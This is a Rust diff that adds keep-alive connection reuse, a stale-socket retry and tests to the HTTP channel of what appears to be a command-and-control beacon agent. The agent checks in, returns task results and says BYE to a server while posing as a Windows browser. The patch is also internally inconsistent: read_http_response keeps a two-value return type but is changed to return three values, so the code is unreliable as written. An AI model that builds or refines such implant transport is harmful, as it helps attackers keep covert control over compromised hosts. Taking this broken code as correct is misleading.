@@ -101,6 +101,10 @@ pub struct HttpChannel {
     sid: Option<String>,
     out: Vec<u8>,
     pending: std::collections::VecDeque<Vec<u8>>,
+    /// Kept across the POSTs of one beacon cycle (handshake, CHECKIN,
+    /// results+BYE), so a cycle costs one TCP connect instead of three. The
+    /// channel is dropped when the cycle ends, so no idle socket outlives it.
+    stream: Option<TcpStream>,
 }
 
 impl HttpChannel {
@@ -121,7 +125,21 @@ impl HttpChannel {
             sid: None,
             out: Vec::new(),
             pending: std::collections::VecDeque::new(),
+            stream: None,
         })
+    }
+
+    fn connect(&self) -> io::Result<TcpStream> {
+        let mut stream = TcpStream::connect_timeout(
+            &(self.host.as_str(), self.port)
+                .to_socket_addrs()?
+                .next()
+                .ok_or_else(|| io::Error::new(io::ErrorKind::AddrNotAvailable, "no address"))?,
+            CONNECT_TIMEOUT,
+        )?;
+        stream.set_read_timeout(Some(IO_TIMEOUT))?;
+        stream.set_write_timeout(Some(IO_TIMEOUT))?;
+        Ok(stream)
     }
 
     fn target(&self) -> String {
@@ -134,29 +152,35 @@ impl HttpChannel {
     fn post(&mut self, allow_empty: bool) -> io::Result<()> {
         let body = std::mem::take(&mut self.out);
         let target = self.target();
-        let mut stream = TcpStream::connect_timeout(
-            &(self.host.as_str(), self.port)
-                .to_socket_addrs()?
-                .next()
-                .ok_or_else(|| io::Error::new(io::ErrorKind::AddrNotAvailable, "no address"))?,
-            CONNECT_TIMEOUT,
-        )?;
-        stream.set_read_timeout(Some(IO_TIMEOUT))?;
-        stream.set_write_timeout(Some(IO_TIMEOUT))?;
+        if self.stream.is_none() {
+            self.stream = Some(self.connect()?);
+        }
 
-        let header = format!(
-            "POST {} HTTP/1.1\r\nHost: {}:{}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\
-             Content-Type: application/octet-stream\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
-            target,
-            self.host,
-            self.port,
-            body.len()
-        );
-        stream.write_all(header.as_bytes())?;
-        stream.write_all(&body)?;
-        stream.flush()?;
+        // A reused socket can already be closed by the server (idle timeout,
+        // restart), which shows up as a failed write or a premature EOF. Drop
+        // it and try once on a fresh connection. A retry may re-send the
+        // frames of this POST; that is safe here because every agent-to-server
+        // frame is idempotent (RESULT is keyed by task id, CHECKIN and BYE
+        // carry no state).
+        let mut attempt = 0;
+        let (status, payload) = loop {
+            let mut stream = self.stream.take().expect("stream checked above");
+            let result = exchange(&mut stream, &target, &self.host, self.port, &body);
+            match result {
+                Ok((status, payload, reusable)) => {
+                    if reusable {
+                        self.stream = Some(stream);
+                    }
+                    break (status, payload);
+                }
+                Err(e) if attempt == 0 && is_stale_connection(&e) => {
+                    attempt += 1;
+                    self.stream = Some(self.connect()?);
+                }
+                Err(e) => return Err(e),
+            }
+        };
 
-        let (status, payload) = read_http_response(&mut stream)?;
         if status != 200 {
             return Err(io::Error::new(
                 io::ErrorKind::ConnectionAborted,
@@ -204,6 +228,7 @@ impl Channel for HttpChannel {
     fn close(&mut self) {
         self.out.clear();
         self.pending.clear();
+        self.stream = None;
     }
 
     fn set_session_id(&mut self, sid: &str) {
@@ -211,7 +236,47 @@ impl Channel for HttpChannel {
     }
 }
 
-/// Read one HTTP/1.1 response and return (status, body).
+/// Send one request on an open connection and read its response.
+///
+/// Returns `(status, body, reusable)`; `reusable` is false when the server
+/// ended the connection (chunked or close-delimited body, `Connection: close`),
+/// in which case the socket must not be used again.
+fn exchange(
+    stream: &mut TcpStream,
+    target: &str,
+    host: &str,
+    port: u16,
+    body: &[u8],
+) -> io::Result<(u16, Vec<u8>, bool)> {
+    let header = format!(
+        "POST {} HTTP/1.1\r\nHost: {}:{}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\
+         Content-Type: application/octet-stream\r\nContent-Length: {}\r\n\
+         Connection: keep-alive\r\n\r\n",
+        target,
+        host,
+        port,
+        body.len()
+    );
+    stream.write_all(header.as_bytes())?;
+    stream.write_all(body)?;
+    stream.flush()?;
+    read_http_response(stream)
+}
+
+/// True for the errors a half-closed, reused connection produces.
+fn is_stale_connection(e: &io::Error) -> bool {
+    matches!(
+        e.kind(),
+        io::ErrorKind::BrokenPipe
+            | io::ErrorKind::ConnectionReset
+            | io::ErrorKind::ConnectionAborted
+            | io::ErrorKind::NotConnected
+            | io::ErrorKind::UnexpectedEof
+            | io::ErrorKind::WouldBlock
+    )
+}
+
+/// Read one HTTP/1.1 response and return (status, body, reusable).
 fn read_http_response<R: Read>(r: &mut R) -> io::Result<(u16, Vec<u8>)> {
     let mut buf = Vec::with_capacity(8192);
     let mut chunk = [0u8; 4096];
@@ -244,6 +309,7 @@ fn read_http_response<R: Read>(r: &mut R) -> io::Result<(u16, Vec<u8>)> {
 
     let mut content_length: Option<usize> = None;
     let mut chunked = false;
+    let mut close = false;
     for line in lines {
         let lower = line.to_ascii_lowercase();
         if let Some(v) = lower.strip_prefix("content-length:") {
@@ -251,6 +317,9 @@ fn read_http_response<R: Read>(r: &mut R) -> io::Result<(u16, Vec<u8>)> {
         }
         if lower.starts_with("transfer-encoding:") && lower.contains("chunked") {
             chunked = true;
+        }
+        if let Some(v) = lower.strip_prefix("connection:") {
+            close = v.trim() == "close";
         }
     }
 
@@ -264,7 +333,7 @@ fn read_http_response<R: Read>(r: &mut R) -> io::Result<(u16, Vec<u8>)> {
             }
             body.extend_from_slice(&chunk[..n]);
         }
-        return Ok((status, dechunk(&body)?));
+        return Ok((status, dechunk(&body)?, false));
     }
     match content_length {
         Some(len) => {
@@ -276,6 +345,9 @@ fn read_http_response<R: Read>(r: &mut R) -> io::Result<(u16, Vec<u8>)> {
                 body.extend_from_slice(&chunk[..n]);
             }
             body.truncate(len);
+            // A length-delimited body is exactly consumed, so the socket is
+            // still positioned at the next response.
+            return Ok((status, body, !close));
         }
         None => loop {
             let n = r.read(&mut chunk)?;
@@ -285,7 +357,7 @@ fn read_http_response<R: Read>(r: &mut R) -> io::Result<(u16, Vec<u8>)> {
             body.extend_from_slice(&chunk[..n]);
         },
     }
-    Ok((status, body))
+    Ok((status, body, false))
 }
 
 fn find_subslice(haystack: &[u8], needle: &[u8]) -> Option<usize> {
@@ -331,6 +403,52 @@ mod tests {
     fn dechunk_roundtrip() {
         let raw = b"4\r\nWiki\r\n5\r\npedia\r\n0\r\n\r\n";
         assert_eq!(dechunk(raw).unwrap(), b"Wikipedia");
+    }
+
+    fn parse(raw: &[u8]) -> (u16, Vec<u8>, bool) {
+        read_http_response(&mut std::io::Cursor::new(raw.to_vec())).unwrap()
+    }
+
+    #[test]
+    fn length_delimited_response_is_keep_alive() {
+        // Exactly one response on the wire; the body must stop at
+        // Content-Length and the socket must stay usable.
+        let raw = b"HTTP/1.1 200 OK\r\nContent-Length: 3\r\n\r\nabc";
+        let (status, body, reusable) = parse(raw);
+        assert_eq!(status, 200);
+        assert_eq!(body, b"abc");
+        assert!(reusable);
+    }
+
+    #[test]
+    fn connection_close_is_not_reusable() {
+        let raw = b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
+        let (_, body, reusable) = parse(raw);
+        assert!(body.is_empty());
+        assert!(!reusable);
+    }
+
+    #[test]
+    fn chunked_response_is_not_reusable() {
+        let raw = b"HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n3\r\nabc\r\n0\r\n\r\n";
+        let (_, body, reusable) = parse(raw);
+        assert_eq!(body, b"abc");
+        assert!(!reusable);
+    }
+
+    #[test]
+    fn stale_connection_errors_are_retryable() {
+        for kind in [
+            io::ErrorKind::BrokenPipe,
+            io::ErrorKind::ConnectionReset,
+            io::ErrorKind::UnexpectedEof,
+        ] {
+            assert!(is_stale_connection(&io::Error::new(kind, "x")), "{kind:?}");
+        }
+        assert!(!is_stale_connection(&io::Error::new(
+            io::ErrorKind::InvalidData,
+            "x"
+        )));
     }
 
     #[test]
